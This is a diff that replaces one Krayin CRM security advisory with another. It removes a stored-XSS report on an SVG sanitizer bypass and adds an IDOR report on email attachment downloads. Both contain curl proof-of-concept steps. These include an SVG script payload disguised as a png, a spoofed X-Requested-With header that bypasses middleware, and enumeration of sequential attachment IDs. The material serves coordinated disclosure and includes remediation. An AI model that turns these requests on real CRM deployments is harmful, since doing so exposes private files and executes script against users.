@@ -1,482 +1,531 @@
-\# Stored XSS via SVG Sanitizer Bypass in TinyMCE Media Upload (Krayin CRM ≤ 2.2.5)
+# Security Report — IDOR: Email Attachment Download (CWE-639 / CWE-862)
 
+## Vulnerability Information
 
+**Product:** Krayin CRM 2.2.5  
+**Affected Versions:** Krayin CRM 2.2.4 and 2.2.5  
+**Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Broken Access Control  
+**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
+**Additional CWE:** CWE-862 — Missing Authorization  
+**Severity:** Medium  
+**CVSS v3.1 Score:** 6.5  
+**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N  
 
-\## CVE Description
-
-
-
-A stored cross-site scripting (XSS) vulnerability in the TinyMCE media upload functionality of Krayin CRM through 2.2.5 allows an authenticated user with TinyMCE upload permissions to bypass SVG sanitization and upload a malicious SVG file containing JavaScript. The vulnerability occurs because SVG detection relies on the client-controlled filename extension instead of the actual file content, allowing an attacker to upload SVG content using a non-SVG filename. The uploaded file is stored as an SVG on the public storage disk and served as `image/svg+xml`, resulting in JavaScript execution in the application origin.
-
-
-
-\## Summary
-
-
-
-Krayin implements SVG sanitization for TinyMCE uploads through the `Sanitizer` trait. However, the decision to apply sanitization is based on the client-supplied filename extension rather than trusted file content.
-
-
-
-An attacker can upload an SVG payload named with a non-SVG extension, such as `evil.png`. The `isSvgFile()` validation returns false because it checks the user-controlled extension, causing the sanitizer to be skipped. The upload process later determines the file extension from the actual content and stores the file as an `.svg` file.
-
-
-
-The resulting file is stored under the public storage directory:
-
-
+**Affected Component:** Email Attachment Download  
+**Affected Endpoint:**
 
 ```
-
-/storage/tinymce/<hash>.svg
-
+GET /admin/mail/attachment-download/{id}
 ```
 
+**Authentication Required:** Yes  
+**User Interaction Required:** No  
+**Exploit Complexity:** Low  
 
+**Attacker Profile:**  
+Any authenticated user, including restricted custom roles with only dashboard permission.
 
-and served with:
+**Status:** Confirmed by source code review and live Proof of Concept (PoC).
 
+---
 
+# 1. Executive Summary
 
-```
+Krayin CRM 2.2.5 contains an Insecure Direct Object Reference (IDOR) vulnerability in the email attachment download functionality.
 
-Content-Type: image/svg+xml
-
-```
-
-
-
-Opening the URL executes the embedded JavaScript in the CRM origin.
-
-
-
-This vulnerability represents a bypass of the SVG sanitizer protection and remains present in the TinyMCE upload path, independent from other upload-related fixes introduced in version 2.2.5.
-
-
-
-\## Severity
-
-
-
-\*\*High\*\*
-
-
-
-\*\*CVSS v3.1:\*\* `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (\*\*8.7\*\*)
-
-
-
-Stored XSS reachable by authenticated users with TinyMCE upload access. The stored payload is additionally accessible without authentication through the public `/storage` path.
-
-
-
-\## Affected Versions
-
-
-
-Confirmed on:
-
-
-
-\- Krayin CRM 2.2.4
-
-\- Krayin CRM 2.2.5
-
-
-
-The vulnerable `TinyMCEController` implementation and `Sanitizer` trait behavior are identical across both versions.
-
-
-
-\## Affected Component
-
-
-
-\*\*Controller\*\*
-
-
+The endpoint:
 
 ```
-
-Webkul\\Admin\\Http\\Controllers\\TinyMCEController
-
+GET /admin/mail/attachment-download/{id}
 ```
 
+allows authenticated users to download email attachments by supplying a numeric attachment identifier.
 
+The application retrieves the attachment exclusively by its database ID and does not perform any authorization validation to confirm whether the current user has permission to access the requested attachment.
 
-Methods:
+Although attachments are stored on a private local filesystem, the storage location does not provide protection because the controller directly exposes the file after retrieving the object.
 
+A low-privileged dashboard-only account, without access to the mailbox containing the attachment, was able to download another user's private attachment by changing the attachment ID.
 
+The vulnerability exists because of multiple authorization failures:
 
-```
+- Missing ACL permission mapping
+- Middleware bypass through client-controlled AJAX header
+- Missing object-level authorization in the controller
 
-upload()
+The issue remains exploitable in Krayin CRM 2.2.5 and presents the same behavior observed in version 2.2.4.
 
-storeMedia()
+---
 
-```
+# 2. Vulnerability Description
 
-
-
-\*\*Trait\*\*
-
-
-
-```
-
-Webkul\\Core\\Traits\\Sanitizer
+The vulnerable endpoint:
 
 ```
-
-
-
-Methods:
-
-
-
+/admin/mail/attachment-download/{id}
 ```
 
-isSvgFile()
+accepts an attacker-controlled numeric identifier.
 
-sanitizeSvg()
-
-```
-
-
-
-\*\*Endpoint\*\*
-
-
-
-```
-
-POST /admin/tinymce/upload
-
-```
-
-
-
-\---
-
-
-
-\## Technical Description
-
-
-
-The upload routine stores the file using the server-detected extension:
-
-
+The controller performs:
 
 ```php
+$attachment = $this->attachmentRepository->findOrFail($id);
 
-$extension = $file->extension();
-
-
-
-$filename = md5($file->getClientOriginalName().time()).'.'.$extension;
-
-
-
-$path = $file->storeAs(
-
-&#x20;   $this->storagePath,
-
-&#x20;   $filename
-
+return Storage::disk(
+    AttachmentRepository::resolveDisk($attachment->path)
+)->download(
+    $attachment->path,
+    $attachment->name
 );
-
 ```
 
+The application trusts the supplied ID and directly returns the associated file.
 
+No verification is performed to check:
 
-However, SVG detection relies on the client-controlled filename:
+- Whether the user owns the email
+- Whether the user can view the mailbox
+- Whether the user has permission to access the attachment
+- Whether the attachment belongs to an authorized resource
 
+Because attachment IDs are sequential, an attacker can enumerate identifiers and access files belonging to other users.
 
+---
+
+# 3. Root Cause Analysis
+
+## 3.1 Missing ACL Authorization Mapping (CWE-862)
+
+The route:
+
+```
+admin.mail.attachment_download
+```
+
+does not exist in the application's ACL permission configuration.
+
+Because the permission is not registered:
+
+- Bouncer authorization is never applied.
+- Roles cannot restrict this functionality.
+- Any authenticated user can reach the controller.
+
+This creates a missing authorization control.
+
+---
+
+## 3.2 sanitize_url Middleware Bypass
+
+The route is protected by the `sanitize_url` middleware.
+
+However, the middleware contains the following logic:
 
 ```php
-
-public function isSvgFile(UploadedFile $file): bool
-
+public function handle($request, Closure $next)
 {
+    if ($request->ajax()) {
+        return $next($request);
+    }
 
-&#x20;   return str\_contains(
-
-&#x20;       strtolower($file->getClientOriginalExtension()),
-
-&#x20;       'svg'
-
-&#x20;   );
-
+    // validation logic
 }
-
 ```
 
-
-
-An attacker can upload SVG content using a filename such as:
-
-
+The application trusts:
 
 ```
-
-evil.png
-
+X-Requested-With: XMLHttpRequest
 ```
 
+which is completely controlled by the client.
 
+An attacker can bypass the middleware validation by sending:
 
-The sanitizer check evaluates:
-
-
-
+```http
+X-Requested-With: XMLHttpRequest
 ```
 
-client extension = png
-
-```
-
-
-
-and skips sanitization.
-
-
-
-The application later detects the real content type:
-
-
-
-```
-
-extension = svg
-
-```
-
-
-
-and stores:
-
-
-
-```
-
-<md5>.svg
-
-```
-
-
-
-The malicious SVG is then served as:
-
-
-
-```
-
-Content-Type: image/svg+xml
-
-```
-
-
-
-allowing embedded JavaScript execution.
-
-
-
-\---
-
-
-
-\## Proof of Concept
-
-
-
-Authenticate as a user with TinyMCE upload access:
-
-
+Example:
 
 ```bash
-
-BASE=https://TARGET
-
-CJ=$(mktemp)
-
-
-
-LT=$(curl -s -c "$CJ" "$BASE/admin/login" \\
-
-&#x20;| grep -oE 'name="\_token" value="\[^"]+"' \\
-
-&#x20;| sed -E 's/.\*value="(\[^"]+)".\*/\\1/')
-
-
-
-curl -s -b "$CJ" -c "$CJ" \\
-
-&#x20; -o /dev/null \\
-
-&#x20; -X POST "$BASE/admin/login" \\
-
-&#x20; --data-urlencode "\_token=$LT" \\
-
-&#x20; --data-urlencode "email=admin@example.com" \\
-
-&#x20; --data-urlencode "password=admin123"
-
-
-
-XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\\s+(\\S+)',open('$CJ').read()).group(1)))")
-
-
-
-printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.png
-
-
-
-curl -s -b "$CJ" \\
-
-&#x20; -X POST "$BASE/admin/tinymce/upload" \\
-
-&#x20; -H "X-XSRF-TOKEN: $XSRF" \\
-
-&#x20; -H "Accept: application/json" \\
-
-&#x20; -F "file=@evil.png;type=image/svg+xml"
-
+curl \
+-H "X-Requested-With: XMLHttpRequest" \
+http://target/admin/mail/attachment-download/1
 ```
 
+The request is then processed without the intended validation.
 
+---
 
-\### Observed Result
+## 3.3 Missing Object-Level Authorization (CWE-639)
 
-
-
-The server returns a location similar to:
-
-
+The vulnerable method:
 
 ```
-
-/storage/tinymce/<hash>.svg
-
+Mail\EmailController::download()
 ```
 
+only performs:
 
-
-Accessing the URL returns:
-
-
-
+```php
+findOrFail($id)
 ```
 
-HTTP/200 OK
+followed by:
 
-Content-Type: image/svg+xml
-
+```php
+Storage::download()
 ```
 
+There is no:
 
+- Ownership verification
+- Email visibility check
+- Permission validation
+- Relationship validation
 
-The SVG content remains unsanitized and the embedded JavaScript executes in the CRM origin.
-
-
-
-The `/storage` URL does not require authentication.
-
-
-
-\---
-
-
-
-\## Impact
-
-
-
-Successful exploitation allows an authenticated attacker with TinyMCE upload permissions to execute arbitrary JavaScript in the CRM application context.
-
-
-
-Potential impacts include:
-
-
-
-\- Session theft;
-
-\- CSRF token exposure;
-
-\- Performing actions as another user;
-
-\- Administrative account compromise when accessed by privileged users;
-
-\- Persistent malicious content hosted on the application domain.
-
-
-
-\---
-
-
-
-\## Suggested Remediation
-
-
-
-\- Detect SVG files using trusted server-side content inspection instead of client-controlled filenames.
-
-\- Always apply SVG sanitization based on actual file content.
-
-\- Reject uploads when sanitization fails.
-
-\- Avoid storing active content such as SVG files on publicly accessible storage.
-
-\- Serve uploaded files using restrictive headers such as `Content-Disposition` and an appropriate Content Security Policy (CSP).
-
-
-
-\---
-
-
-
-\## Weakness Classification
-
-
-
-\- \*\*Primary:\*\* CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
-
-\- \*\*Root Cause:\*\* CWE-646 — Reliance on File Name or Extension of Externally-Supplied File
-
-\- \*\*Contributing:\*\* CWE-434 — Unrestricted Upload of File with Dangerous Type
-
-\- \*\*Additional:\*\* CWE-693 — Protection Mechanism Failure
-
-
-
-\*\*VulDB Classification\*\*
-
-
+Unlike safer implementations such as:
 
 ```
-
-Cross Site Scripting
-
+ActivityController::download()
 ```
 
+the email attachment download function does not call authorization methods.
+
+---
+
+# 4. Proof of Concept (PoC)
+
+## 4.1 Environment Setup
+
+Target attachment:
+
+```
+Attachment ID: 1
+Filename: xss.svg
+Size: 75 bytes
+Storage:
+storage/app/emails/1/eQ49...
+```
+
+The attachment belongs to an email unavailable to the low-privileged user.
+
+---
+
+# 4.2 Creating a Restricted Dashboard-Only User
+
+Create role:
+
+```bash
+docker exec krayin-2.2.5 sh -lc \
+"mysql -ukrayin -pkrayin krayin -e \
+\"INSERT INTO roles 
+(name,description,permission_type,permissions,created_at,updated_at)
+VALUES
+('idor862','poc','custom','[\\\"dashboard\\\"]',NOW(),NOW());\""
+```
+
+Retrieve role ID:
+
+```bash
+RID=$(docker exec krayin-2.2.5 sh -lc \
+"mysql -ukrayin -pkrayin krayin -N -e \
+\"SELECT id FROM roles WHERE name='idor862';\"")
+```
+
+Create user:
+
+```bash
+docker exec krayin-2.2.5 php \
+/var/www/laravel-crm/artisan tinker \
+--execute="
+DB::table('users')->insert([
+'name'=>'idor862',
+'email'=>'idor862@test.local',
+'password'=>bcrypt('test123'),
+'status'=>1,
+'role_id'=>$RID,
+'created_at'=>now(),
+'updated_at'=>now()
+]);
+"
+```
+
+---
+
+# 4.3 Authentication
+
+```bash
+B="http://localhost:8085"
+J="$(mktemp)"
+
+curl -s \
+-c "$J" \
+-b "$J" \
+"$B/admin/login" \
+-o /tmp/login.html
 
 
-\---
+TOKEN=$(grep -oE \
+'name="_token" value="[^"]+"' \
+/tmp/login.html \
+| head -1 \
+| sed -E 's/.*value="([^"]+)".*/\1/')
 
 
+curl -s \
+-c "$J" \
+-b "$J" \
+-d "_token=$TOKEN" \
+--data-urlencode "email=idor862@test.local" \
+--data-urlencode "password=test123" \
+"$B/admin/login"
+```
 
-\## Disclosure
+---
 
+# 4.4 Control Test — Request Without AJAX Header
 
+Request:
 
-Reported privately under coordinated vulnerability disclosure.
+```bash
+curl -s \
+-b "$J" \
+"$B/admin/mail/attachment-download/1"
+```
 
+Result:
 
+```
+Blocked by sanitize_url middleware
+```
 
-Proof-of-concept, reproduction steps, and affected version evidence are available upon request.
+---
 
+# 4.5 Exploitation — AJAX Header Bypass
 
+Request:
 
-Please credit the reporter and request a CVE identifier if applicable.
+```bash
+curl -s \
+-b "$J" \
+-H "X-Requested-With: XMLHttpRequest" \
+"$B/admin/mail/attachment-download/1" \
+-o /tmp/idor.out \
+-w "HTTP=%{http_code} SIZE=%{size_download} TYPE=%{content_type}\n"
+```
 
+Result:
+
+```
+HTTP=200
+SIZE=75
+TYPE=image/svg+xml
+```
+
+Downloaded content:
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>alert("XSS")</script>
+</svg>
+```
+
+The dashboard-only user successfully downloaded a private attachment.
+
+---
+
+# 4.6 Evidence Summary
+
+| Test | Request | Result |
+|---|---|---|
+| Control | `/admin/mail/attachment-download/1` without AJAX header | Blocked |
+| Exploit | `/admin/mail/attachment-download/1` with AJAX header | 200 OK - File Downloaded |
+
+---
+
+# 4.7 Attachment Enumeration
+
+Because attachment IDs are sequential:
+
+```
+/admin/mail/attachment-download/1
+/admin/mail/attachment-download/2
+/admin/mail/attachment-download/3
+...
+```
+
+an attacker can automate retrieval of all stored attachments.
+
+---
+
+# 4.8 Cleanup
+
+```bash
+docker exec krayin-2.2.5 sh -lc \
+"mysql -ukrayin -pkrayin krayin -e \
+\"DELETE FROM users WHERE email='idor862@test.local';
+DELETE FROM roles WHERE name='idor862';\""
+```
+
+---
+
+# 5. Impact Assessment
+
+An authenticated attacker can access confidential files stored as email attachments.
+
+Potentially exposed information:
+
+- Customer documents
+- Contracts
+- Invoices
+- Identity documents
+- Internal communications
+- Business files
+- Private attachments
+
+The vulnerability bypasses the application's intended mailbox visibility controls.
+
+The normal interface correctly hides unauthorized emails, but the direct endpoint completely bypasses these restrictions.
+
+---
+
+# 6. Security Impact Scenario
+
+Attack flow:
+
+```
+Authenticated User
+        |
+        |
+        v
+Modify attachment ID
+        |
+        |
+        v
+GET /admin/mail/attachment-download/{id}
+        |
+        |
+        v
+Missing Authorization Check
+        |
+        |
+        v
+Private Attachment Disclosure
+```
+
+---
+
+# 7. Remediation Recommendations
+
+## 7.1 Implement Object-Level Authorization
+
+The controller must verify access before returning files.
+
+Example:
+
+```php
+$attachment = $this->attachmentRepository->findOrFail($id);
+
+$this->authorize(
+    'view',
+    $attachment->email
+);
+
+return Storage::download(
+    $attachment->path,
+    $attachment->name
+);
+```
+
+---
+
+## 7.2 Add ACL Permission
+
+Register:
+
+```
+admin.mail.attachment_download
+```
+
+inside:
+
+```
+acl.php
+```
+
+Use a default-deny authorization model.
+
+---
+
+## 7.3 Remove AJAX Header Trust
+
+The following header must never be considered a security mechanism:
+
+```
+X-Requested-With
+```
+
+The middleware should validate all requests regardless of:
+
+- AJAX
+- Browser type
+- Client headers
+
+---
+
+## 7.4 Fix Incorrect HTTP Status Handling
+
+Unauthorized requests should return:
+
+```
+401 Unauthorized
+```
+
+or:
+
+```
+403 Forbidden
+```
+
+The application currently masks some authorization failures by returning:
+
+```
+HTTP 200
+```
+
+with an error response body.
+
+---
+
+# 8. Vulnerability Classification Summary
+
+| Field | Value |
+|---|---|
+| Vulnerability | IDOR |
+| CWE | CWE-639 |
+| Additional CWE | CWE-862 |
+| Authentication | Required |
+| Privileges Required | Low |
+| User Interaction | None |
+| Exploit Complexity | Low |
+| Confidentiality Impact | High |
+| Integrity Impact | None |
+| Availability Impact | None |
+
+---
+
+# 9. Final Conclusion
+
+Krayin CRM 2.2.5 contains an authorization bypass vulnerability affecting email attachment downloads.
+
+Any authenticated user can retrieve private attachments by manipulating the numeric attachment identifier.
+
+The vulnerability exists due to:
+
+1. Missing ACL permission enforcement.
+2. Client-controlled middleware bypass.
+3. Missing object-level authorization.
+
+The issue allows unauthorized disclosure of sensitive files and should be corrected by implementing proper authorization checks before allowing attachment downloads.
